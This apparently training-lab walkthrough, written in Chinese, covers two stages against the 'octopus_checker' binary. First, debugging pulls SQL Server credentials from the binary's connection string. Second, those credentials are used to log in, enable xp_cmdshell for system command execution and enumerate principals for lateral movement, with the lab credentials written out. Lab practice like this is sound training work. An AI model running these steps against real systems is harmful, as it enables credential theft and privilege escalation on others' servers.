# 攻擊連接到服務的應用程式(SSH)

### **1. 發現點**

1.  **使用 SSH 連接目標伺服器**

    ```bash
    ssh htb-student@10.129.205.20
    ```

    * 帳密為：`htb-student:HTB_@cademy_stdnt!`
2. **分析 `octopus_checker` 二進位檔案**
   * 這是一個可能與資料庫或其他服務連接的應用程式
   * 目標是從該應用程式中提取**連接資訊（Connection Strings）**

***

### **🚀 2. 測試Payload**

1.  **使用 GDB（GNU Debugger）載入 `octopus_checker`**

    ```bash
    gdb ./octopus_checker
    ```
2.  **設定 Intel 反組譯格式，分析 `main()`**

    ```bash
    set disassembly-flavor intel
    disas main
    ```
3. **尋找 SQL 相關函數**
   * 觀察 `SQLAllocHandle`、`SQLSetEnvAttr`、`SQLDriverConnect` 等 SQL 相關 API 呼叫
   * 這些 API 通常會包含**數據庫連接資訊**

***

### **🎯 3. 設定斷點 & 讀取憑證**

1.  **找到 `SQLDriverConnect()` 函數**

    ```bash
    b SQLDriverConnect
    run
    ```
2.  **觀察寄存器內容，提取連接字串**

    ```bash
    RDX: "DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost,1401;UID=SA;PWD=N0tS3cr3t!;"
    ```

    * **成功獲取資料庫憑證**
      * **使用者名稱（UID）**：`SA`
      * **密碼（PWD）**：`N0tS3cr3t!`
      * **SQL Server 埠號**：`1401`

***

### **🔗 4. 利用已知憑證**

1.  **嘗試連接 SQL Server**

    ```bash
    mssqlclient.py SA@10.129.205.20 -windows-auth
    ```

    * 輸入密碼：`N0tS3cr3t!`
    * 成功登入 SQL Server，取得資料庫存取權限
2.  **列舉 SQL Server 權限**

    ```sql
    SELECT SYSTEM_USER;
    SELECT USER_NAME();
    ```

    * 確認當前權限，如為 `dbo` 或 `sysadmin` 則可進一步提權

***

### **⚡ 5. 連鎖漏洞（橫向移動 & 提權）**

1.  **嘗試 XP\_CMDshell 開啟 Shell**

    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    EXEC xp_cmdshell 'whoami';
    ```

    * 如果返回 `nt authority\system`，代表已取得系統權限
2.  **嘗試存取 Active Directory**

    * 檢查 SQL Server 是否與 AD 整合

    ```sql
    SELECT name FROM master.sys.server_principals;
    ```

    * 嘗試橫向移動至其他系統

***

####
